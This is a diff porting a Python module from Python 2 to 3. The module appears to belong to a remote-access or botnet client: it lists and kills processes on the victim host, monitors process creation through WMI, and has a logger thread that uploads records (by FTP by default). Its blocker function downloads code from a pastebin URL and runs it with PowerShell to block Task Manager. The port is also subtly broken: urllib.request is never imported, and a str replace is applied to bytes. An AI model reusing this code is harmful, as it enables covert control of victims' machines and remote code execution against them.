@@ -9,7 +9,7 @@ import imp
 import json
 import base64
 import urllib
-import StringIO
+from io import StringIO
 import threading
 import collections
 
@@ -23,7 +23,7 @@ usage = 'process <list/search/kill>'
 description = """ 
 List/search/kill currently running processes on the client host machine
 """
-_buffer = StringIO.StringIO()
+_buffer = StringIO()
 _workers = {}
 _abort  = False
 
@@ -47,7 +47,7 @@ def list(*args, **kwargs):
                     break
         return json.dumps(output)
     except Exception as e:
-        util.log("{} error: {}".format(list.func_name, str(e)))
+        util.log("{} error: {}".format(list.__name__, str(e)))
 
 
 def search(keyword):
@@ -74,7 +74,7 @@ def search(keyword):
                     break
         return json.dumps(output)
     except Exception as e:
-        util.log("{} error: {}".format(search.func_name, str(e)))
+        util.log("{} error: {}".format(search.__name__, str(e)))
 
 
 def kill(process_id):
@@ -105,7 +105,7 @@ def kill(process_id):
                     util.log(e)
             return json.dumps(output)
     except Exception as e:
-        util.log("{} error: {}".format(kill.func_name, str(e)))
+        util.log("{} error: {}".format(kill.__name__, str(e)))
 
 
 @util.threaded
@@ -126,7 +126,7 @@ def monitor(name):
         c = wmi.WMI()
         if not len(globals()['_buffer'].getvalue()):
             globals()['_buffer'].write('Time, Owner, Executable, PID, Parent\n')
-        globals()['_workers'][logger.func_name] = logger()
+        globals()['_workers'][logger.__name__] = logger()
         process_watcher = c.Win32_Process.watch_for("creation")
         while True:
             try:
@@ -144,11 +144,11 @@ def monitor(name):
                     if keyword in row:
                         globals()['_buffer'].write(row)
             except Exception as e1:
-                util.log("{} error: {}".format(monitor.func_name, str(e1)))
+                util.log("{} error: {}".format(monitor.__name__, str(e1)))
             if globals()['_abort']:
                 break
     except Exception as e2:
-        util.log("{} error: {}".format(monitor.func_name, str(e2)))
+        util.log("{} error: {}".format(monitor.__name__, str(e2)))
 
 
 @util.threaded
@@ -168,13 +168,13 @@ def logger(mode='ftp'):
                     results.append(result)
                     globals()['_buffer'].reset()
                 except Exception as e:
-                    util.log("{} error: {}".format(logger.func_name, str(e)))
+                    util.log("{} error: {}".format(logger.__name__, str(e)))
             elif globals()['_abort']:
                 break
             else:
                 time.sleep(5)
     except Exception as e:
-        util.log("{} error: {}".format(logger.func_name, str(e)))
+        util.log("{} error: {}".format(logger.__name__, str(e)))
 
 def blocker(process_name='taskmgr.exe'):
     """ 
@@ -184,7 +184,7 @@ def blocker(process_name='taskmgr.exe'):
     :param str process_name:    process name to block (default: taskmgr.exe)
 
     """
-    code = urllib.urlopen('https://pastebin.com/raw/GYFAzpy3').read().replace('__PROCESS__', process_name)
+    code = urllib.request.urlopen('https://pastebin.com/raw/GYFAzpy3').read().replace('__PROCESS__', process_name)
     if os.path.isfile(r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe'):
         powershell = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe' 
     elif os.path.isfile(os.popen('where powershell').read().rstrip()):
